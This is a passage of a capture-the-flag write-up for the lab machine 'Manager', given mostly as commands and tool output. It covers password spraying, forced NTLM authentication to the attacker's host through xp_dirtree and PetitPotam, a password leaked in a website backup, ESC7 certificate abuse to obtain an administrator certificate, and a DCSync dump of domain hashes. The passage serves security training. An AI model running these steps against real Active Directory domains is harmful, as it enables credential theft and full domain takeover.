SMB         10.129.52.126   445    DC01             [-] manager.htb\Ryan: STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [-] manager.htb\Raven: STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [-] manager.htb\JinWoo: STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [-] manager.htb\ChinHae: STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [-] manager.htb\Operator: STATUS_LOGON_FAILURE
```


## Auth as Operator

### Weak password

Since I figured out there was no lockout while brute forcing credentials, I can focus on that

Make a password list based on user names

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ hashcat --force --stdout cme_users.txt -r /usr/share/hashcat/rules/best64.rule > wordlist_operator_b64.txt
```

Cleanup usernames

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cat cme_users_cleaned.txt
Administrator
Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
```

I will use a fast AD auth bruteforce tool from **ShutdownRepo** - [smartbrute](https://github.com/ShutdownRepo/smartbrute)

Took only 1 minute

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ /opt/sectools/ad/smartbrute/smartbrute.py brute -bU cme_users_cleaned.txt -bP wordlist_operator_b64.txt kerberos -d manager.htb

/opt/sectools/ad/smartbrute/smartbrute.py:1727: DeprecationWarning: Nesting argument groups is deprecated.
  kerberos_credentials = kerberos_secrets.add_argument_group("credentials to use")
[*] Starting bruteforce attack on passwords
┌─────────────┬──────────┬──────────┬──────────────────┐
│ domain      │ user     │ password │ details          │
├─────────────┼──────────┼──────────┼──────────────────┤
│ manager.htb │ Operator │ operator │ (probably valid) │
└─────────────┴──────────┴──────────┴──────────────────┘
```

Confirmed the password is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme smb manager.htb -u 'Operator' -p 'operator'
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\Operator:operator
```


## From Operator to Raven

### Enumeration via Operator


#### Enum4linux

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ python /opt/sectools/ad/enum4linux-ng/enum4linux-ng.py -oA enum4linux -A manager.htb -u 'Operator' -p 'operator'
...
```

#### Bloodhound

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager/bloodhound-result]
└─$ bloodhound-python -d manager.htb -ns 10.129.52.126 -u 'Operator' -p 'operator' -c all
INFO: Found AD domain: manager.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.manager.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.manager.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.manager.htb
INFO: Done in 00M 23S
```

#### Ldeep

```bash
mkdir -p ldeep && ldeep ldap -u Operator -p 'operator' -d manager.htb -s ldap://manager.htb all ldeep/
```

#### ldapdomaindump

```bash
ldapdomaindump -o ldapdomaindump -r manager.htb -u 'manager.htb\Operator' -p 'operator'
```

#### CME modules automator

> This is my custom script

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager/bloodhound-result]
└─$ ~/scripts/ad/cme_automator.sh manager.htb -u "Operator" -p "operator"
Choose one or more modules to run [Available Protocols : ldap rdp ssh vnc ftp mssql smb wmi winrm]
Protocols (Ex Format : ldap mssql smb) ~> smb mssql ldap
```

```bash
[*] cme smb manager.htb -u Operator -p operator -M dfscoerce
----------------------------------------
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\Operator:operator
DFSCOERC... 10.129.52.126   445    DC01             VULNERABLE
DFSCOERC... 10.129.52.126   445    DC01             Next step: https://github.com/Wh04m1001/DFSCoerce
----------------------------------------
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\Operator:operator
ENUM_AV     10.129.52.126   445    DC01             Windows Defender INSTALLED
----------------------------------------
[*] cme smb manager.htb -u Operator -p operator -M petitpotam
----------------------------------------
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\Operator:operator
PETITPOT... 10.129.52.126   445    DC01             VULNERABLE
PETITPOT... 10.129.52.126   445    DC01             Next step: https://github.com/topotam/PetitPotam
----------------------------------------
[*] cme smb manager.htb -u Operator -p operator -M spider_plus
----------------------------------------
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\Operator:operator
SPIDER_P... 10.129.52.126   445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_P... 10.129.52.126   445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_P... 10.129.52.126   445    DC01             [*]     STATS_FLAG: True
SPIDER_P... 10.129.52.126   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.129.52.126   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.129.52.126   445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.129.52.126   445    DC01             [*]  OUTPUT_FOLDER: /tmp/cme_spider_plus
SPIDER_P... 10.129.52.126   445    DC01             [+] Saved share-file metadata to "/tmp/cme_spider_plus/10.129.52.126.json".
SPIDER_P... 10.129.52.126   445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_P... 10.129.52.126   445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_P... 10.129.52.126   445    DC01             [*] SMB Filtered Shares:  1
SPIDER_P... 10.129.52.126   445    DC01             [*] Total folders found:  19
SPIDER_P... 10.129.52.126   445    DC01             [*] Total files found:    5
SPIDER_P... 10.129.52.126   445    DC01             [*] File size average:    1.77 KB
SPIDER_P... 10.129.52.126   445    DC01             [*] File size min:        22 B
SPIDER_P... 10.129.52.126   445    DC01             [*] File size max:        4.82 KB
----------------------------------------
[*] cme ldap manager.htb -u Operator -p operator -M adcs
----------------------------------------
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
LDAP        10.129.52.126   389    DC01             [+] manager.htb\Operator:operator
ADCS        10.129.52.126   389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS                                                Found PKI Enrollment Server: dc01.manager.htb
ADCS                                                Found CN: manager-DC01-CA
----------------------------------------
[*] cme ldap manager.htb -u Operator -p operator -M enum_trusts
----------------------------------------
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
LDAP        10.129.52.126   389    DC01             [+] manager.htb\Operator:operator
ENUM_TRU... 10.129.52.126   389    DC01             [*] No trust relationships found
----------------------------------------
...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cat /tmp/cme_spider_plus/10.129.52.126.json|jq .
{
  "NETLOGON": {},
  "SYSVOL": {
    "manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
      "atime_epoch": "2023-09-29 06:21:33",
      "ctime_epoch": "2023-07-27 18:19:12",
      "mtime_epoch": "2023-09-29 06:21:33",
      "size": "23 B"
    },
    "manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2023-09-29 06:21:33",
      "ctime_epoch": "2023-07-27 18:19:12",
      "mtime_epoch": "2023-09-29 06:21:33",
      "size": "1.23 KB"
    },
    "manager.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
      "atime_epoch": "2023-07-27 18:29:46",
      "ctime_epoch": "2023-07-27 18:29:46",
      "mtime_epoch": "2023-07-27 18:29:46",
      "size": "2.72 KB"
    },
    "manager.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
      "atime_epoch": "2023-07-27 20:31:38",
      "ctime_epoch": "2023-07-27 18:19:12",
      "mtime_epoch": "2023-07-27 20:31:38",
      "size": "22 B"
    },
    "manager.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2023-07-27 20:31:38",
      "ctime_epoch": "2023-07-27 18:19:12",
      "mtime_epoch": "2023-07-27 20:31:38",
      "size": "4.82 KB"
    }
  }
}
```


### Password reuse for mssql

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme mssql manager.htb -u 'Operator' -p 'operator'
MSSQL       10.129.52.126   1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.129.52.126   1433   DC01             [+] manager.htb\Operator:operator
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ mssqlclient.py manager.htb/Operator:'operator'@manager.htb -windows-auth
Impacket v0.12.0.dev1+20231012.22017.2de2918 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
```

^c296cc

```bash
SQL (MANAGER\Operator  guest@master)> xp_cmdshell whoami
SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
[%] exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;
ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
```


### Try to crack NET NTLM hash

NTLMv2 hash was not crackable, since it's a machine account

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ sudo responder -A -I tun0 -v
```

```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree \\10.10.16.24\x
[%] exec master.sys.xp_dirtree '\\10.10.16.24\x',1,1
subdirectory   depth   file
------------   -----   ----
```

```bash
[SMB] NTLMv2-SSP Client   : 10.129.52.126
[SMB] NTLMv2-SSP Username : MANAGER\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::MANAGER:124a01c4b018955b:5108CF0179F0D98BA170D12B3336D1C6:01010000000000000020FCB06505DA014E8B9FFD0458606A000000000200080036004C004D00570001001E00570049004E002D00580047004A004D004A0044004C00380048003200540004003400570049004E002D00580047004A004D004A0044004C0038004800320054002E0036004C004D0057002E004C004F00430041004C000300140036004C004D0057002E004C004F00430041004C000500140036004C004D0057002E004C004F00430041004C00070008000020FCB06505DA0106000400020000000800300030000000000000000000000000300000D5A1C716F770A110DF59C2FD3CD88531A90B6B2A11593454C01FEFB416C053FC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320034000000000000000000
[+] Exiting...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cp /usr/share/responder/logs/SMB-NTLMv2-SSP-10.129.52.126.txt .
```

No valid password found

```bash
hashcat SMB-NTLMv2-SSP-10.129.52.126.txt /opt/wordlists/rockyou.txt
hashcat SMB-NTLMv2-SSP-10.129.52.126.txt /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
hashcat SMB-NTLMv2-SSP-10.129.52.126.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```


### Database enumeration

```bash
SQL (MANAGER\Operator  guest@master)> select user_name();
[%] select user_name();

-----
guest
```

```bash
SQL (MANAGER\Operator  guest@master)> enum_users
[%] EXEC sp_helpuser
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID
------------------   --------   ---------   ---------   -------------   ----------   -----
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'

guest                public     NULL        NULL        guest           b'2         '   b'00'

INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL

sys                  public     NULL        NULL        NULL            b'4         '    NULL

SQL (MANAGER\Operator  guest@master)> enum_db
[%] select name, is_trustworthy_on from sys.databases
name     is_trustworthy_on
------   -----------------
master                   0

tempdb                   0

model                    0

msdb                     1

[%] select db_name()
------
master

SQL (MANAGER\Operator  guest@master)> select table_name from information_schema.tables
[%] select table_name from information_schema.tables
table_name
----------------
spt_fallback_db

spt_fallback_dev

spt_fallback_usg

spt_values

spt_monitor
```

Use **Dbeaver** to browse data easier, nothing interesting found

![](/assets/obsidian/2a4a4652fc1a08d6bf73e76118ea95a5.png)

![](/assets/obsidian/3761f63968c2aa6b31e8c1850c554be2.png)

### Raven's credential in website backup

Check web root dir

```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree
[%] exec master.sys.xp_dirtree '',1,1
subdirectory                depth   file
-------------------------   -----   ----
$Recycle.Bin                    1      0

Documents and Settings          1      0

inetpub                         1      0

PerfLogs                        1      0

Program Files                   1      0

Program Files (x86)             1      0

ProgramData                     1      0

Recovery                        1      0

SQL2019                         1      0

System Volume Information       1      0

Users                           1      0

Windows                         1      0

SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub
[%] exec master.sys.xp_dirtree 'C:\inetpub',1,1
subdirectory   depth   file
------------   -----   ----
custerr            1      0

history            1      0

logs               1      0

temp               1      0

wwwroot            1      0

SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
[%] exec master.sys.xp_dirtree 'C:\inetpub\wwwroot',1,1
subdirectory                      depth   file
-------------------------------   -----   ----
about.html                            1      1

contact.html                          1      1

css                                   1      0

images                                1      0

index.html                            1      1

js                                    1      0

service.html                          1      1

web.config                            1      1

website-backup-27-07-23-old.zip       1      1
```

`website-backup-27-07-23-old.zip` is juicy, check if I can download through the web

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ wget manager.htb/website-backup-27-07-23-old.zip

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ mkdir -p loot

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ mv website-backup-27-07-23-old.zip loot
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cd loot

┌──(bravosec㉿fsociety)-[~/htb/Manager/loot]
└─$ unzip -l website-backup-27-07-23-old.zip

┌──(bravosec㉿fsociety)-[~/htb/Manager/loot]
└─$ 7z x website-backup-27-07-23-old.zip -o'website-backup-27-07-23-old'

┌──(bravosec㉿fsociety)-[~/htb/Manager/loot]
└─$ cd website-backup-27-07-23-old
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager/loot/website-backup-27-07-23-old]
└─$ grep -rin passw
```

![](/assets/obsidian/372ca2c658a2dded603e0c338c5c49e9.png)

Got `raven`'s password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager/loot/website-backup-27-07-23-old]
└─$ cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

I knew `raven` is in `Remote Management Users` group from `ldapdomaindump`

> `ldapdomaindump/domain_users_by_group.html`

![](/assets/obsidian/1a22b59b57f756576d43015653c382f1.png)

Confirmed credential is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme winrm manager.htb -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.129.52.126   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.129.52.126   5985   DC01             [*] http://10.129.52.126:5985/wsman
HTTP        10.129.52.126   5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme smb manager.htb -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123
```

### Evil-winrm

1. Sync time with DC via my script (Disables **virtualbox** and system time sync)
2. Configure `kerberos` for further uses of `kerberos` auth with **evil-winrm**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ ~/scripts/ad/sync_ntp.sh manager.htb

┌──(bravosec㉿fsociety)-[~/htb/Manager/loot/website-backup-27-07-23-old]
└─$ python ~/scripts/ad/configure_krb5.py manager.htb DC01
[*] This script must be run as root
[*] Configuration Data:
[libdefault]
        default_realm = MANAGER.HTB

[realms]
        MANAGER.HTB = {
                kdc = dc01.manager.htb
                admin_server = dc01.manager.htb
        }

[domain_realm]
        manager.htb = MANAGER.HTB
        .manager.htb = MANAGER.HTB


[!] Above Configuration will overwrite /etc/krb5.conf, are you sure? [y/N] y
[+] /etc/krb5.conf has been configured
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ evil-winrm -i DC01.manager.htb -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> whoami
manager\raven
294f8c4a4e70c7e142a8f005235d5a4c
*Evil-WinRM* PS C:\Users\Raven\Documents>
```

# Root Flag
---

## From Raven to domain admin

### Enumeration

```bash
*Evil-WinRM* PS C:\Users\Raven\Documents> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
manager\raven S-1-5-21-4078382237-1492182817-2568127209-1116


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Update bloodhound result

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme ldap manager.htb -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' --bloodhound -c All -ns 10.129.52.126
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
LDAP        10.129.52.126   389    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123
LDAP        10.129.52.126   389    DC01             Resolved collection methods: session, dcom, localadmin, trusts, psremote, acl, objectprops, group, rdp, container
LDAP        10.129.52.126   389    DC01             Done in 00M 22S
LDAP        10.129.52.126   389    DC01             Compressing output into /home/kali/.cme/logs/DC01_10.129.52.126_2023-10-23_175934bloodhound.zip
```

Since this AD have ADCS, I'll try certificate abuse

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ certipy find -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.129.52.126' -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```

### Abuse certificate - ESC7

Google : `hacker recipes ESC7`

> https://www.thehacker.recipes/a-d/movement/ad-cs/access-controls#certificate-authority-esc7

![](/assets/obsidian/30ecfa7df880e1b5973e8fe737964e04.png)

> Detailed ESC7 Abuse - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2

> If got `[-] Got access denied trying to issue certificate` while issuing the request, that means `raven` got removed automatically from `ManageCertificates`
> 
> Put the commands in a bash script to be fast enough
{: .prompt-tip }

> Enable `SubCA` template if it was disabled
> ```bash
> certipy ca -ca 'manager-DC01-CA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -enable-template 'SubCA'
> ```
{: .prompt-info }

Get `administrator`'s certificate

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.52.126 -ca 'manager-DC01-CA' -add-officer raven
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ certipy req -ca 'manager-DC01-CA' -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -target DC01.manager.htb -template SubCA -upn administrator@manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 22
Would you like to save the private key? (y/N) y
[*] Saved private key to 22.key
[-] Failed to request certificate

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ certipy ca -ca 'manager-DC01-CA' -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -issue-request 22
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ certipy req -ca 'manager-DC01-CA' -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -target DC01.manager.htb -retrieve 22
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 22
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '22.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

Pass the cert to get TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ certipy auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

DCSync (Not using NTLM auth for OPSEC safe)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ export KRB5CCNAME=administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ secretsdump.py -k dc01.manager.htb -outputfile secretsdump
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cat secretsdump*|grep -iE 'krbtgt|admin'
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b5edce70e6c1efa075f14bcf5231f79a:::
Administrator:aes256-cts-hmac-sha1-96:2faa969559ff2172f63bb1479ff74629d4189a65f50b1d5c6a6b5a956b6c4e47
Administrator:aes128-cts-hmac-sha1-96:849897137b988c25cac24a9cc485fecc
Administrator:des-cbc-md5:26e9b370b5d5c8a2
krbtgt:aes256-cts-hmac-sha1-96:61d78925d23ca4f3b253d2974612e1f6eda77965cd6f81502414efa5420a39f3
krbtgt:aes128-cts-hmac-sha1-96:22922b27e90a53020eed589b0b9b125d
krbtgt:des-cbc-md5:ae1aa7a40db502ba
Administrator:500:aad3b435b51404eeaad3b435b51404ee:343cb5ec10f9de622c06668783b158f1:::
```


### Evil-winrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ export KRB5CCNAME=administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ evil-winrm -r manager.htb -i dc01.manager.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
manager\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
cc606870518672da7b8b5fab2912ddff
```


# Additional
---

## AD-Miner - AD audit tool

> https://github.com/Mazars-Tech/AD_Miner

Start bloodhound and import data into Neo4j

Then start analyzing data

```bash
AD-miner -c -cf Manager.htb -u neo4j -p <PASSWORD>
xdg-open render_Manager.htb/index.html
```

It provides a good insight 

![](/assets/obsidian/d433e5f81ff5a433a2de1c9c03e5a111.png)

![](/assets/obsidian/30fa4451cfda1e868392f02fb8229aed.png)

![](/assets/obsidian/3b5d93fe59fd5fbfc0359fada5f44b54.png)

![](/assets/obsidian/577113c2100917830d5bb5420ada0ef4.png)

![](/assets/obsidian/5cfb25536177636a19ee84679222dddc.png)


## PetitPotam - Auth Coerce

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ sudo responder -A -I tun0 -v
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ python /opt/sectools/ad/PetitPotam/PetitPotam.py -d manager.htb -u "Operator" -p "operator" $(pt get lhost) manager.htb
```

```bash
[SMB] NTLMv2-SSP Client   : 10.129.52.126
[SMB] NTLMv2-SSP Username : MANAGER\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::MANAGER:305491a70e7b7f5a:D1C111A6C9BB49AC3944F55FD16E4447:0101000000000000801103DB6805DA01D51A46D3E31362F80000000002000800450054005500520001001E00570049004E002D005A003100410033004900420030004F00590057004C0004003400570049004E002D005A003100410033004900420030004F00590057004C002E0045005400550052002E004C004F00430041004C000300140045005400550052002E004C004F00430041004C000500140045005400550052002E004C004F00430041004C0007000800801103DB6805DA0106000400020000000800300030000000000000000000000000400000D5A1C716F770A110DF59C2FD3CD88531A90B6B2A11593454C01FEFB416C053FC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320034000000000000000000
[+] Exiting...
```

## msdat - MSSQL exploitation tool

> https://github.com/quentinhardy/msdat

```bash
